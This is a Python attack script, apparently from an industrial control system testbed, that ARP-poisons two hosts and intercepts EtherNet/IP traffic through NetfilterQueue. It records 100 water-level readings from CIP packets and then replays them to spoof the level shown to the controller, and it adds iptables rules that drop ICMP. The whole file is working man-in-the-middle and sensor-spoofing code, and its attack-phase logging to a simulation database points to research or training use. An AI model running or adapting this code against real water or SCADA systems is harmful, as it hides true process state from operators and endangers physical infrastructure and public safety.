import cip
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.all import Ether
from scapy.all import Raw
from scapy.all import *
import time
import sys
import os

import sqlite3

# connection to the database
conn = sqlite3.connect('../../ICS_topologies/scada_topology/minitown_db.sqlite')
c = conn.cursor()

enip_port = 44818

sniffed_packet = []
injection_phase = 0
nfqueue = NetfilterQueue()

def sniff(value):
    print ("In sniff------------")
    sniffed_packet.append(value)
    c.execute("UPDATE minitown SET value = 2 WHERE name = 'ATT_1'")
    conn.commit()
    if len(sniffed_packet) == 100:
        global injection_phase
        injection_phase = 1

def injection(raw):
    print ("In injection-----------")
    fake_value = sniffed_packet[0]
    sniffed_packet.pop(0)
    c.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_1'")
    conn.commit()
    pay = translate_float_to_load(fake_value, raw[0], raw[1])
    return pay


def capture(packet):
    global injection_phase

    pkt = IP(packet.get_payload())
    if len(pkt) == 102:
        raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
        float_value = translate_load_to_float(raw)

        if not injection_phase:
            sniff(float_value)
        else:
            try:
                pay = injection(raw)
                pkt[Raw].load = pay  # This is an IP packet
                del pkt[TCP].chksum  # Needed to recalculate the checksum
                packet.set_payload(str(pkt))
            except IndexError:
                print("sniffed packets finished")
                __setdown(enip_port)
                return 0
    packet.accept()


def translate_load_to_float(raw_load):
    test = raw_load[5] + raw_load[4] + raw_load[3] + raw_load[2]  # Handle endianness with the payload
    hex_value = test.encode("hex")  # Encode as HEX
    float_value = struct.unpack('!f', hex_value.decode('hex'))[0]  # Convert HEX into float
    return float_value


def translate_float_to_load(fv, header0, header1):
    un = hex(struct.unpack('<I', struct.pack('<f', fv))[0])  # Convert to hex again
    to_proces = un[2:].decode("hex")  # Decode as string
    pay = header0 + header1 + to_proces[-1] + to_proces[-2] + to_proces[-3] + to_proces[0]  # Re arrange for endianness. This is a string
    return pay

def start():
    __setup(enip_port)
    nfqueue.bind(0, capture)
    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
    conn.commit()
    try:
        print("[*] starting water level spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown(enip_port)
    return 0


def __setup(port):

    cmd = 'iptables -t mangle -A PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)

    cmd = 'iptables -A FORWARD -p icmp -j DROP'
    os.system(cmd)

    cmd = 'iptables -A INPUT -p icmp -j DROP'
    os.system(cmd)

    cmd = 'iptables -A OUTPUT -p icmp -j DROP'
    os.system(cmd)

    launch_arp_poison()

def __setdown(port):
    cmd = 'sudo iptables -t mangle -D PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)

    nfqueue.unbind()
    print("[*] stopping water level spoofing")
    c.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
    conn.commit()

def launch_arp_poison():
    print("[*] launching arp poison")

    targetip = "192.168.1.20"
    sourceip = "192.168.1.10"

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sourceip)
    sourcemac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc

    spoof_arp_cache(sourceip, sourcemac, targetip)
    spoof_arp_cache(targetip, targetmac, sourceip)
    print("[*] network poisoned")

def spoof_arp_cache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)


if __name__ == '__main__':
    sys.exit(start())
